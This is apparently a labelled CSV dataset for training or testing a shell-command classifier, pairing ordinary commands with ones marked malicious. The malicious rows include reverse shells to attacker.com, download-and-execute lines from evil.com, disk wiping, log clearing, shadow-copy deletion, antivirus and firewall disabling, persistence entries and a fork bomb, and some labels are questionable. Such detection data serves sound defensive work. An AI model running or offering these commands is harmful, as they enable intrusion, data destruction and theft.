command,label
wget http://malicious.com/malware.exe 2>&1,malicious
w,benign
sudo history,benign
dd if=/dev/zero of=/dev/sda &,malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
touch newfile.txt > output.txt,benign
net localgroup administrators hacker /add,malicious
yum list installed,benign
mount,benign
chmod 777 /etc/shadow,malicious
ufw status,benign
rsync -av /src/ /dst/ 2>/dev/null,benign
wc -l document.txt | head -5,benign
cat /etc/passwd,benign
ssh user@server.com,benign
which python 2>/dev/null,benign
w,benign
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
netsh advfirewall set allprofiles state off,malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
nc -l -p 4444 -e /bin/bash,malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
id user,benign
wget http://malicious.com/malware.exe,malicious
(format C: /q /x),malicious
which python --help,benign
sudo passwd user,benign
curl http://evil.com/payload.sh | bash,malicious
nohup rm -rf /,malicious
echo 'virus' > /etc/passwd,malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
sdelete -p 10 -s -z C:\,malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
chmod 777 /etc/shadow,malicious
sdelete -p 10 -s -z C:\,malicious
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
netstat -tulpn,benign
timeout 60 python -m http.server 8080,malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
python -m http.server 8080,malicious
crontab -l,benign
usermod -aG sudo user,benign
systemctl status nginx -v,benign
head -10 logfile.txt,benign
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
apt list --installed --help,benign
useradd newuser,benign
taskkill /f /im antimalware.exe,malicious
userdel olduser,benign
bcdedit /set {default} bootstatuspolicy ignoreallfailures &,malicious
cp file1.txt file2.txt,benign
echo 'Hello World',benign
vssadmin delete shadows /all /quiet >/dev/null,malicious
mkfs.ext4 /dev/sda1,malicious
nohup certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
dd if=/dev/zero of=/dev/sda,malicious
attrib +h +s malware.exe,malicious
ping -c 4 google.com,benign
crontab -l,benign
chmod 755 script.sh,benign
docker ps,benign
ps aux,benign
ufw status,benign
history,benign
history,benign
netsh advfirewall set allprofiles state off,malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
systemctl reload nginx,benign
sort data.txt,benign
du -sh /var/log --help,benign
finger user,benign
vssadmin delete shadows /all /quiet,malicious
nc -l -p 4444 -e /bin/bash,malicious
history,benign
uptime 2>/dev/null,benign
cmd /c del /q /s C:\*,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
net localgroup administrators hacker /add,malicious
useradd newuser | head -5,benign
uptime | head -5,benign
mkdir -p /tmp/test,benign
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
apt list --installed --help,benign
htop --help,benign
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
sudo ps aux,benign
type ls 2>/dev/null,benign
iptables -L 2>/dev/null,benign
wevtutil cl System,malicious
cipher /w:C:\,malicious
docker images --help,benign
net user hacker password123 /add,malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
rsync -av /src/ /dst/,benign
echo 'Hello World',benign
iptables -L,benign
systemctl reload nginx -v,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
(mshta javascript:alert('code execution')),malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
wevtutil cl Security,malicious
sudo date,benign
diskpart select disk 0 clean &,malicious
systemctl status nginx | head -5,benign
fdisk -l,benign
taskkill /f /im antimalware.exe,malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
sort data.txt,benign
(attrib +h +s malware.exe),malicious
cat /etc/passwd,benign
mount,benign
ping -c 4 google.com,benign
passwd user,benign
npm list 2>/dev/null,benign
du -sh /var/log | head -5,benign
service apache2 status > output.txt,benign
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
sudo lsblk,benign
echo 'virus' > /etc/passwd,malicious
format C: /q /x,malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
docker ps | head -5,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
nohup regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
wget http://malicious.com/malware.exe,malicious
vmstat,benign
sudo type ls,benign
chmod 755 script.sh | head -5,benign
apt list --installed > output.txt,benign
vssadmin delete shadows /all /quiet,malicious
mkfs.ext4 /dev/sda1 &,malicious
grep pattern file.txt > output.txt,benign
passwd user,benign
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
node --version,benign
id user --help,benign
which python,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
diskpart select disk 0 clean,malicious
git clone https://github.com/user/repo.git,benign
echo 'virus' > /etc/passwd,malicious
cp file1.txt file2.txt --help,benign
iostat > output.txt,benign
traceroute google.com,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
umount /dev/sdb1,benign
scp file.txt user@server:/path/,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
mkdir -p /tmp/test,benign
uniq sorted.txt -v,benign
npm list,benign
date,benign
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
"cut -d',' -f1 data.csv 2>/dev/null",benign
scp file.txt user@server:/path/,benign
chown user:group file.txt > output.txt,benign
docker ps,benign
curl -I https://google.com,benign
timeout 60 vssadmin delete shadows /all /quiet,malicious
rm -rf /,malicious
cat /etc/passwd,benign
touch newfile.txt,benign
ssh user@server.com,benign
passwd user,benign
rsync -av /src/ /dst/,benign
fdisk -l,benign
ping -c 4 google.com,benign
python -m http.server 8080,malicious
htop,benign
useradd newuser,benign
echo 'virus' > /etc/passwd,malicious
man ls,benign
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
ls -la | head -5,benign
taskkill /f /im antimalware.exe &,malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1 >/dev/null,malicious
taskkill /f /im antimalware.exe,malicious
wc -l document.txt,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS') &",malicious
wevtutil cl System,malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
net user hacker password123 /add,malicious
net user hacker password123 /add 2>&1,malicious
"cut -d',' -f1 data.csv",benign
cmd /c del /q /s C:\*,malicious
netsh advfirewall set allprofiles state off,malicious
docker ps,benign
pwd,benign
awk '{print $1}' data.txt -v,benign
nohup cmd /c del /q /s C:\*,malicious
format C: /q /x,malicious
python --version 2>/dev/null,benign
cipher /w:C:\,malicious
"python -c 'import os; os.system(""rm -rf /"")' 2>&1",malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
du -sh /var/log,benign
mkdir -p /tmp/test > output.txt,benign
timeout 60 wget http://malicious.com/malware.exe,malicious
java -version,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash &",malicious
format C: /q /x,malicious
ls -la,benign
net localgroup administrators hacker /add,malicious
apt list --installed,benign
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")' &",malicious
traceroute google.com,benign
iptables -L,benign
nohup rm -rf /,malicious
who,benign
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
df -h --help,benign
userdel olduser,benign
timeout 60 copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
python --version,benign
rsync -av /src/ /dst/ > output.txt,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ >/dev/null,malicious
kubectl get pods,benign
chmod 777 /etc/shadow,malicious
cat /dev/urandom > /dev/sda,malicious
mkfs.ext4 /dev/sda1,malicious
sudo chown user:group file.txt,benign
git pull origin main,benign
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")' >/dev/null",malicious
diskpart select disk 0 clean,malicious
systemctl status nginx,benign
systemctl status nginx,benign
cipher /w:C:\,malicious
git pull origin main,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
(dd if=/dev/zero of=/dev/sda),malicious
chmod 777 /etc/shadow,malicious
diskpart select disk 0 clean,malicious
"python -c 'import os; os.system(""rm -rf /"")'",malicious
ps aux | head -5,benign
systemctl status nginx,benign
wget http://malicious.com/malware.exe,malicious
fdisk -l,benign
kubectl get pods,benign
passwd user,benign
sdelete -p 10 -s -z C:\,malicious
curl -I https://google.com,benign
python --version,benign
"cut -d',' -f1 data.csv",benign
grep pattern file.txt,benign
ufw status,benign
useradd newuser | head -5,benign
sort data.txt,benign
timeout 60 certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
rm -rf /,malicious
:(){ :|:& };:,malicious
ps aux,benign
uptime,benign
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
net localgroup administrators hacker /add,malicious
ss -tulpn | head -5,benign
sudo mkdir -p /tmp/test,benign
timeout 60 sdelete -p 10 -s -z C:\,malicious
wevtutil cl Security,malicious
whoami,benign
wevtutil cl Security,malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
"timeout 60 python -c 'import os; os.system(""rm -rf /"")'",malicious
wevtutil cl Security,malicious
(bash -i >& /dev/tcp/attacker.com/443 0>&1),malicious
ncat -lvp 443 -e cmd.exe,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
python --version | head -5,benign
nc -l -p 4444 -e /bin/bash,malicious
passwd user,benign
python -m http.server 8080,malicious
(reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe),malicious
man ls,benign
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
docker ps > output.txt,benign
du -sh /var/log,benign
top,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
chown user:group file.txt | head -5,benign
yum list installed,benign
wevtutil cl Security,malicious
rmdir empty_folder | head -5,benign
systemctl status nginx,benign
netsh advfirewall set allprofiles state off,malicious
mv old.txt new.txt,benign
chmod 777 /etc/shadow,malicious
id user > output.txt,benign
python -m http.server 8080,malicious
(schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon),malicious
wget http://malicious.com/malware.exe,malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
diskpart select disk 0 clean,malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
umount /dev/sdb1 > output.txt,benign
ncat -lvp 443 -e cmd.exe,malicious
wc -l document.txt,benign
useradd newuser,benign
yum list installed,benign
date -v,benign
nohup wmic process call create 'cmd.exe /c powershell.exe',malicious
format C: /q /x,malicious
mount,benign
format C: /q /x >/dev/null,malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
ufw status,benign
sc stop Windows Defender,malicious
(mshta javascript:alert('code execution')),malicious
nohup net user hacker password123 /add,malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
crontab -l,benign
timeout 60 certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
ps aux,benign
chown user:group file.txt 2>/dev/null,benign
vssadmin delete shadows /all /quiet,malicious
(curl http://evil.com/payload.sh | bash),malicious
rmdir empty_folder,benign
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
cat /dev/urandom > /dev/sda,malicious
dd if=/dev/zero of=/dev/sda,malicious
apt list --installed --help,benign
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
net localgroup administrators hacker /add,malicious
sudo tail -f /var/log/syslog,benign
systemctl status nginx,benign
history > output.txt,benign
cipher /w:C:\,malicious
docker ps,benign
crontab -l,benign
rsync -av /src/ /dst/,benign
nohup taskkill /f /im antimalware.exe,malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
cat /dev/urandom > /dev/sda,malicious
vssadmin delete shadows /all /quiet,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ >/dev/null,malicious
cipher /w:C:\,malicious
mkdir -p /tmp/test,benign
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
sudo pip list,benign
fdisk -l,benign
free -m,benign
sdelete -p 10 -s -z C:\,malicious
top,benign
traceroute google.com | head -5,benign
rmdir empty_folder 2>/dev/null,benign
mshta javascript:alert('code execution'),malicious
tail -f /var/log/syslog,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
last > output.txt,benign
vmstat,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
rsync -av /src/ /dst/,benign
bash -i >& /dev/tcp/attacker.com/443 0>&1 2>&1,malicious
"python -c 'import os; os.system(""rm -rf /"")'",malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
sudo wget https://example.com/file.txt,benign
traceroute google.com,benign
netsh advfirewall set allprofiles state off,malicious
vssadmin delete shadows /all /quiet &,malicious
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
ls -la -v,benign
nohup wmic process call create 'cmd.exe /c powershell.exe',malicious
docker ps,benign
lsblk | head -5,benign
sdelete -p 10 -s -z C:\,malicious
htop,benign
htop,benign
netsh advfirewall set allprofiles state off,malicious
:(){ :|:& };:,malicious
uniq sorted.txt,benign
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures &,malicious
iostat,benign
mv old.txt new.txt,benign
taskkill /f /im antimalware.exe &,malicious
yum list installed --help,benign
yum list installed,benign
ufw status,benign
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
mkfs.ext4 /dev/sda1,malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
ss -tulpn,benign
nohup chmod 777 /etc/shadow,malicious
w,benign
rsync -av /src/ /dst/ --help,benign
"cut -d',' -f1 data.csv",benign
who,benign
passwd user > output.txt,benign
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
attrib +h +s malware.exe,malicious
vssadmin delete shadows /all /quiet,malicious
docker images,benign
cipher /w:C:\,malicious
"awk 'BEGIN {s = ""/inet/tcp/0/attacker.com/443""; while(42) { do{ printf ""shell>"" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != ""exit"") close(s); }}' /dev/null",malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
rm -rf / &,malicious
du -sh /var/log,benign
pip list,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
